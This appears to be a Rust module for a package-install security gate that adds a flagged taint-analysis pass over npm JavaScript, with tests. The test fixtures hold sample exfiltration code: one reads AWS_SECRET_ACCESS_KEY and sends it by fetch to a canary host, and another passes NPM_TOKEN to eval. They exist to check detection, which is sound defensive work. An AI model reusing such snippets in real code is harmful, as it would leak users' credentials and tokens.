//! Optional SOUND dataflow verification for JS package sources (flagged
//! prototype).
//!
//! ## Why this exists
//!
//! The install/inspect-time gate today profiles a package with the lightweight
//! TEXT SCAN in [`crate::profiler`] (`SourceProfiler`). That scanner is
//! deliberately conservative and fails closed on the obfuscation it recognises,
//! but it is still fundamentally a substring/heuristic detector: it models data
//! FLOWS as a coarse cross-product of detected source KINDS x sink KINDS over a
//! whole file, and it can only reason about call shapes it has hand-coded
//! markers for. The durable fix for the whole bypass class is the SOUND
//! interprocedural-taint engine that already powers in-cell execution
//! (`omc-frontend-js` -> `omc-verify::verify_module`): it lowers real JS into
//! microcode and tracks taint precisely from each capability SOURCE to each
//! SINK through locals, calls, and the `fetch(url, { body })` body slot.
//!
//! ## What this module wires (prototype)
//!
//! Behind a flag (default OFF), for JS sources only, we additionally lower each
//! `.js`/`.mjs`/`.cjs` file with `omc-frontend-js` and run `verify_module`
//! against the SAME effective install policy the profiler verdict used. Any
//! findings the sound engine reports are returned to the caller, which folds
//! them into the existing `verifier_findings` list. This is purely ADDITIVE:
//!
//! * Flag OFF  => this module returns an empty vec without touching the source,
//!   so the verdict, recorded findings, and performance are byte-identical to
//!   today.
//! * Flag ON   => the sound findings can only push a verdict from `Accepted` to
//!   `Blocked` (it appends findings; it never removes a profiler finding and
//!   never clears one). A file the front end cannot lower (outside the subset)
//!   is SKIPPED here — the profiler's own verdict for that file is unchanged, so
//!   the prototype never weakens the deny-by-default scanner.
//!
//! The flag is read from the `OMC_SOUND_VERIFY` environment variable (`1`/
//! `true`/`yes`/`on`, case-insensitive) and/or from a caller-supplied config
//! boolean (see [`sound_verify_enabled`]). The full integration plan to make
//! this the default later lives in `docs/SOUND-VERIFY.md`.

use std::io::{Cursor, Read};
use std::path::Path;

use flate2::read::GzDecoder;
use tar::Archive;
use walkdir::WalkDir;

use omc_cap::Policy;
use omc_format::BehaviorType;

use crate::verify::render_verify_finding;
use crate::{ResolvedPackage, MAX_FILE_BYTES};

/// True when the optional sound JS verification path should run for this
/// install. The env var is the always-available operator switch; `config_flag`
/// lets a future config field (`[verify] sound = true`) turn it on per project
/// without an env var. Either being truthy enables it. Default (both off /
/// unset) is OFF, so the standard install path is unchanged.
pub(crate) fn sound_verify_enabled(config_flag: bool) -> bool {
    config_flag || env_flag_is_truthy()
}

fn env_flag_is_truthy() -> bool {
    match std::env::var("OMC_SOUND_VERIFY") {
        Ok(value) => matches!(
            value.trim().to_ascii_lowercase().as_str(),
            "1" | "true" | "yes" | "on"
        ),
        Err(_) => false,
    }
}

/// One file the sound pass should consider: a JS source path plus its decoded
/// contents.
struct JsSource {
    path: String,
    content: String,
}

/// Run the sound JS taint analysis over every lowerable JS file in `package`'s
/// archive bytes and return the rendered findings (tagged with the file they
/// came from). Returns an empty vec when nothing fires, when the package is not
/// npm, or when no JS file is lowerable. This NEVER errors out the install: a
/// front-end error on one file means that file is outside the verifiable subset
/// and is left to the profiler's own (unchanged) verdict.
pub(crate) fn sound_verify_js_archive(
    package: &ResolvedPackage,
    bytes: &[u8],
    policy: &Policy,
) -> Vec<String> {
    if package.ecosystem != crate::Ecosystem::Npm {
        return Vec::new();
    }
    let sources = collect_js_sources_from_archive(package, bytes);
    sound_verify_js_sources(package, &sources, policy)
}

/// Directory variant of [`sound_verify_js_archive`] for `omc compile <dir>`.
pub(crate) fn sound_verify_js_directory(
    package: &ResolvedPackage,
    root: &Path,
    policy: &Policy,
) -> Vec<String> {
    if package.ecosystem != crate::Ecosystem::Npm {
        return Vec::new();
    }
    let sources = collect_js_sources_from_directory(root);
    sound_verify_js_sources(package, &sources, policy)
}

fn sound_verify_js_sources(
    package: &ResolvedPackage,
    sources: &[JsSource],
    policy: &Policy,
) -> Vec<String> {
    let mut findings = Vec::new();
    for source in sources {
        let meta = omc_frontend_js::PackageMeta {
            package: package.name.clone(),
            version: package.version.clone(),
            declared_behavior: BehaviorType::Unknown,
        };
        // Outside the supported subset => not verifiable by the sound engine.
        // Skip it (the profiler already produced the verdict for this file);
        // we must never RELAX, and a skip adds nothing, so it cannot.
        let Ok(output) = omc_frontend_js::compile(&source.content, &meta) else {
            continue;
        };
        // Single-module sound verification: `verify_module` runs the same
        // interprocedural taint engine in-cell uses, analysing every function
        // as an entry with Public args. Cross-package `CallImport`s resolve to
        // a foreign body here (handled conservatively by the engine); precise
        // intra-file source->sink flows (env/fs read -> fetch body / fs write /
        // eval / proc spawn) are caught exactly.
        if let Err(error) = omc_verify::verify_module(&output.module, policy) {
            for finding in error.findings {
                findings.push(format!(
                    "[sound-verify] {}: {}",
                    source.path,
                    render_verify_finding(finding)
                ));
            }
        }
    }
    findings
}

/// Decode the JS source files (`.js`/`.mjs`/`.cjs`) from an npm tarball. Mirrors
/// the profiler's archive walk (same size cap, same lossy-UTF8 decode) but keeps
/// only files the JS front end could plausibly lower. A non-tarball filename
/// (a bare source file passed directly) is scanned as a single source.
fn collect_js_sources_from_archive(package: &ResolvedPackage, bytes: &[u8]) -> Vec<JsSource> {
    let mut sources = Vec::new();
    if package.filename.ends_with(".tgz") || package.filename.ends_with(".tar.gz") {
        let decoder = GzDecoder::new(Cursor::new(bytes));
        let mut archive = Archive::new(decoder);
        let Ok(entries) = archive.entries() else {
            return sources;
        };
        for entry in entries.flatten() {
            let mut entry = entry;
            if !entry.header().entry_type().is_file() || entry.size() > MAX_FILE_BYTES {
                continue;
            }
            let Ok(path) = entry.path() else { continue };
            let path = path.to_string_lossy().into_owned();
            if !is_lowerable_js_path(&path) {
                continue;
            }
            let mut raw = Vec::new();
            if entry.read_to_end(&mut raw).is_err() {
                continue;
            }
            push_js_source(&mut sources, path, &raw);
        }
    } else if is_lowerable_js_path(&package.filename) {
        push_js_source(&mut sources, package.filename.clone(), bytes);
    }
    sources
}

fn collect_js_sources_from_directory(root: &Path) -> Vec<JsSource> {
    let mut sources = Vec::new();
    for entry in WalkDir::new(root)
        .follow_links(false)
        .into_iter()
        .filter_map(std::result::Result::ok)
    {
        if !entry.file_type().is_file() {
            continue;
        }
        let Ok(metadata) = entry.metadata() else {
            continue;
        };
        if metadata.len() > MAX_FILE_BYTES {
            continue;
        }
        let relative = entry
            .path()
            .strip_prefix(root)
            .unwrap_or(entry.path())
            .to_string_lossy()
            .replace('\\', "/");
        if !is_lowerable_js_path(&relative) {
            continue;
        }
        // batou:ignore file_read -- walking the operator-supplied source tree
        // being compiled is the explicit purpose of `omc compile <dir>`, and the
        // root is bounded by the WalkDir over that very directory.
        let Ok(raw) = std::fs::read(entry.path()) else {
            continue;
        };
        push_js_source(&mut sources, relative, &raw);
    }
    sources
}

fn push_js_source(sources: &mut Vec<JsSource>, path: String, raw: &[u8]) {
    // Lossy decode mirrors the profiler: a file is always best-effort scanned.
    // (The profiler separately fails closed on non-UTF8 source bytes via its own
    // DynamicEval emission, so we do not need to re-flag that here.)
    let content = String::from_utf8_lossy(raw).into_owned();
    if content.is_empty() {
        return;
    }
    sources.push(JsSource { path, content });
}

/// Only the JS-family extensions the front end lowers. TypeScript and JSX are
/// outside the current `omc-frontend-js` subset, so we do not feed them in (they
/// would just produce front-end errors we skip anyway). Declaration files and
/// the usual non-source dirs are excluded.
fn is_lowerable_js_path(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    if lower.ends_with(".d.ts") || lower.ends_with(".d.mts") || lower.ends_with(".d.cts") {
        return false;
    }
    if is_excluded_dir_component(&lower) {
        return false;
    }
    matches!(
        Path::new(&lower).extension().and_then(|ext| ext.to_str()),
        Some("js" | "mjs" | "cjs")
    )
}

fn is_excluded_dir_component(lower_path: &str) -> bool {
    lower_path.split('/').any(|component| {
        matches!(
            component,
            "node_modules"
                | ".git"
                | ".omc"
                | "target"
                | "build"
                | "dist"
                | "test"
                | "tests"
                | "__tests__"
                | "docs"
                | "doc"
                | "examples"
                | "example"
        )
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    use omc_cap::Policy;

    fn npm_package(name: &str) -> ResolvedPackage {
        ResolvedPackage {
            ecosystem: crate::Ecosystem::Npm,
            name: name.to_owned(),
            version: "1.0.0".to_owned(),
            source_url: "file:///tmp/x".to_owned(),
            download_url: None,
            local_path: None,
            filename: "index.js".to_owned(),
            expected_sha256: None,
            expected_sha1: None,
            expected_integrity: None,
            npm_direct_tarball: false,
            pypi_direct_wheel: false,
            npm_scripts: std::collections::BTreeMap::new(),
            platform_compatible: true,
            dependencies: Vec::new(),
        }
    }

    // The install gate's effective policy: benign runtime caps auto-accepted
    // (env/fs read, http host, dns, time, random) but NO flow grant, exactly
    // like `allow_benign_runtime_capabilities` produces at install time.
    fn install_policy() -> Policy {
        crate::allow_benign_runtime_capabilities(Policy::pure())
    }

    /// PROOF 1 — an ALIASED env -> network exfil. The secret is read into a
    /// local, the local is copied to a second local, and the second local is the
    /// `fetch` body. The sound engine tracks the taint through both locals into
    /// the request body and BLOCKS (no env->net flow grant); the bytes never
    /// touch a real secret or host (canary.invalid).
    #[test]
    fn aliased_exfil_blocked_by_sound_engine() {
        let src = "module.exports = function f() { \
                   const secret = process.env.AWS_SECRET_ACCESS_KEY; \
                   const copy = secret; \
                   return fetch('https://canary.invalid/c', copy); };";
        let pkg = npm_package("aliased-exfil");
        let findings = sound_verify_js_archive(&pkg, src.as_bytes(), &install_policy());
        assert!(
            !findings.is_empty(),
            "aliased env->network exfil must be caught by the sound engine"
        );
    }

    /// PROOF 2 — an EVAL-based sink. The secret is read into a local and passed
    /// to `eval(...)`; the front end lowers this to `DynamicEval` with the
    /// tainted source on the stack. The install policy never grants
    /// `DynamicEval`, so the sound engine BLOCKS.
    #[test]
    fn eval_exfil_blocked_by_sound_engine() {
        let src = "module.exports = function f() { \
                   const secret = process.env.NPM_TOKEN; \
                   return eval(secret); };";
        let pkg = npm_package("eval-exfil");
        let findings = sound_verify_js_archive(&pkg, src.as_bytes(), &install_policy());
        assert!(
            !findings.is_empty(),
            "eval of a tainted secret must be caught by the sound engine"
        );
    }

    /// A genuinely pure module produces NO sound findings, so the pass never
    /// turns an Accepted verdict into a false Blocked.
    #[test]
    fn pure_module_has_no_sound_findings() {
        let src = "module.exports = function isOdd(n) { return n % 2 === 1; };";
        let pkg = npm_package("is-odd");
        let findings = sound_verify_js_archive(&pkg, src.as_bytes(), &install_policy());
        assert!(
            findings.is_empty(),
            "a pure module must not produce sound-verify findings: {findings:?}"
        );
    }

    /// A non-npm package is never fed to the JS front end.
    #[test]
    fn non_npm_package_is_skipped() {
        let mut pkg = npm_package("py-thing");
        pkg.ecosystem = crate::Ecosystem::Pypi;
        let findings = sound_verify_js_archive(&pkg, b"import os", &install_policy());
        assert!(findings.is_empty());
    }
}

/// End-to-end tests through the real `compile_source_path` install-style verdict
/// gate, exercising the flag OFF (default) and ON. These run serially (they
/// mutate the process-wide `OMC_SOUND_VERIFY` env var) under a shared lock.
#[cfg(test)]
mod end_to_end {
    use crate::{compile_source_path, Behavior, CompileSourceOptions, Ecosystem, Verdict};

    // The env var is process-global; serialize the on/off tests so one test's
    // flag state cannot leak into another running in parallel.
    static ENV_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

    struct FlagGuard {
        _lock: std::sync::MutexGuard<'static, ()>,
    }
    impl FlagGuard {
        fn on() -> Self {
            let lock = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
            std::env::set_var("OMC_SOUND_VERIFY", "1");
            Self { _lock: lock }
        }
        fn off() -> Self {
            let lock = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
            std::env::remove_var("OMC_SOUND_VERIFY");
            Self { _lock: lock }
        }
    }
    impl Drop for FlagGuard {
        fn drop(&mut self) {
            std::env::remove_var("OMC_SOUND_VERIFY");
        }
    }

    fn compile_js(src: &str) -> crate::OmcArtifact {
        let dir = tempfile::tempdir().unwrap();
        let source = dir.path().join("source");
        std::fs::create_dir_all(&source).unwrap();
        std::fs::write(source.join("index.js"), src).unwrap();
        compile_source_path(CompileSourceOptions {
            project_dir: dir.path().to_path_buf(),
            source_path: source,
            ecosystem: Ecosystem::Npm,
            name: "e2e".to_owned(),
            version: "1.0.0".to_owned(),
            allowed_capabilities: Vec::new(),
            allowed_flows: Vec::new(),
            write_artifact: false,
        })
        .unwrap()
        .artifact
    }

    /// FLAG DEFAULT OFF: a pure module verifies and records ZERO sound-verify
    /// findings, so the verdict and recorded findings are exactly the profiler's.
    #[test]
    fn flag_off_is_byte_identical_for_pure_module() {
        let _guard = FlagGuard::off();
        let art = compile_js("module.exports = function isOdd(n) { return n % 2 === 1; };");
        assert_eq!(art.behavior, Behavior::Pure);
        assert_eq!(art.verdict, Verdict::Accepted);
        assert!(
            !art.verifier_findings
                .iter()
                .any(|f| f.contains("[sound-verify]")),
            "flag OFF must never emit sound-verify findings: {:?}",
            art.verifier_findings
        );
    }

    /// FLAG ON, ALIASED exfil: the sound engine runs end-to-end through the
    /// verdict gate and appends a `[sound-verify]` finding for the env->network
    /// flow (no flow grant), keeping the verdict Blocked. Canary host only.
    #[test]
    fn flag_on_aliased_exfil_emits_sound_finding() {
        let _guard = FlagGuard::on();
        let art = compile_js(
            "module.exports = function f() { \
             const secret = process.env.AWS_SECRET_ACCESS_KEY; \
             const copy = secret; \
             return fetch('https://canary.invalid/c', copy); };",
        );
        assert_eq!(art.verdict, Verdict::Blocked);
        assert!(
            art.verifier_findings
                .iter()
                .any(|f| f.contains("[sound-verify]")),
            "flag ON must surface the sound engine's finding for the aliased \
             exfil: {:?}",
            art.verifier_findings
        );
    }

    /// FLAG ON, EVAL-based exfil: the sound engine appends a `[sound-verify]`
    /// finding for the tainted `eval`, keeping the verdict Blocked.
    #[test]
    fn flag_on_eval_exfil_emits_sound_finding() {
        let _guard = FlagGuard::on();
        let art = compile_js(
            "module.exports = function f() { \
             const secret = process.env.NPM_TOKEN; \
             return eval(secret); };",
        );
        assert_eq!(art.verdict, Verdict::Blocked);
        assert!(
            art.verifier_findings
                .iter()
                .any(|f| f.contains("[sound-verify]")),
            "flag ON must surface the sound engine's finding for the eval \
             exfil: {:?}",
            art.verifier_findings
        );
    }

    /// FLAG ON, pure module: the sound pass must NOT manufacture a finding, so a
    /// genuinely pure package stays Accepted (no false strengthening).
    #[test]
    fn flag_on_pure_module_stays_accepted() {
        let _guard = FlagGuard::on();
        let art = compile_js("module.exports = function isOdd(n) { return n % 2 === 1; };");
        assert_eq!(art.verdict, Verdict::Accepted);
        assert!(
            !art.verifier_findings
                .iter()
                .any(|f| f.contains("[sound-verify]")),
            "flag ON must not invent findings for a pure module: {:?}",
            art.verifier_findings
        );
    }
}
